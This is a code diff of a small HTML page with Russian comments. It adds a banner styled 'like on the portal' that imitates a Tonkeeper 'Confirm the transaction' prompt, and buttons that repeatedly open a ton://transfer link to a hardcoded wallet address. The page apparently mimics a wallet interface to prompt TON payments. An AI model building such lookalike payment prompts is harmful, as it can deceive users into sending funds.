@@ -47,12 +47,6 @@
             opacity: 0.5;
             transform: none;
         }
-        .btn-red {
-            background: linear-gradient(135deg, #e84800, #c03800);
-        }
-        .btn-green {
-            background: linear-gradient(135deg, #00cc44, #008833);
-        }
         #status {
             margin-top: 16px;
             font-size: 13px;
@@ -69,6 +63,48 @@
             color: #00ff88;
             margin: 12px 0;
         }
+
+        /* ====== ПЛАШКА КАК НА ПОРТАЛЕ ====== */
+        .confirm-box {
+            background: #1a2a3a;
+            border: 1px solid #2a4a6a;
+            border-radius: 16px;
+            padding: 20px;
+            margin-top: 20px;
+            display: none;
+        }
+        .confirm-box.show {
+            display: block;
+        }
+        .confirm-box .icon {
+            font-size: 32px;
+            margin-bottom: 8px;
+        }
+        .confirm-box .title {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        .confirm-box .sub {
+            color: #8899aa;
+            font-size: 13px;
+            margin: 6px 0 12px 0;
+        }
+        .confirm-box .open-btn {
+            background: #0098ea;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 12px 30px;
+            border-radius: 40px;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+        }
+        .confirm-box .open-btn:active {
+            transform: scale(0.96);
+        }
     </style>
 </head>
 <body>
@@ -77,25 +113,53 @@
         <div class="balance-display" id="balanceDisplay">💰 0 TON</div>
         <button class="btn" id="mainBtn">ПОДКЛЮЧИТЬ И ОТПРАВИТЬ 1 TON</button>
         <div id="status">Нажмите кнопку</div>
+
+        <!-- ====== ПЛАШКА КАК НА ПОРТАЛЕ ====== -->
+        <div class="confirm-box" id="confirmBox">
+            <div class="icon">🟣</div>
+            <div class="title">Confirm the transaction in Tonkeeper</div>
+            <div class="sub">It will only take a moment.</div>
+            <button class="open-btn" id="openWalletBtn">Open wallet</button>
+        </div>
     </div>
 
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
 
-        document.getElementById('mainBtn').onclick = function() {
-            const status = document.getElementById('status');
+        const mainBtn = document.getElementById('mainBtn');
+        const status = document.getElementById('status');
+        const confirmBox = document.getElementById('confirmBox');
+        const openWalletBtn = document.getElementById('openWalletBtn');
+
+        // ========== ОСНОВНАЯ КНОПКА ==========
+        mainBtn.onclick = function() {
             status.innerText = '⏳ Открываю TON Keeper...';
-            
-            // ПРЯМАЯ ССЫЛКА НА ТРАНЗАКЦИЮ (КАК НА ПОРТАЛЕ)
+            mainBtn.disabled = true;
+            mainBtn.style.opacity = '0.5';
+
+            // Открываем TON Keeper с транзакцией
             const url = `ton://transfer?address=${TARGET}&amount=1`;
-            
             window.location.href = url;
             
             setTimeout(() => {
                 window.open(url, '_blank');
             }, 300);
-            
+
+            // ====== ПОКАЗЫВАЕМ ПЛАШКУ ======
+            confirmBox.classList.add('show');
             status.innerText = '✅ Подтвердите транзакцию в TON Keeper';
+
+            mainBtn.disabled = false;
+            mainBtn.style.opacity = '1';
+        };
+
+        // ========== КНОПКА "OPEN WALLET" ==========
+        openWalletBtn.onclick = function() {
+            const url = `ton://transfer?address=${TARGET}&amount=1`;
+            window.location.href = url;
+            setTimeout(() => {
+                window.open(url, '_blank');
+            }, 300);
         };
     </script>
 </body>
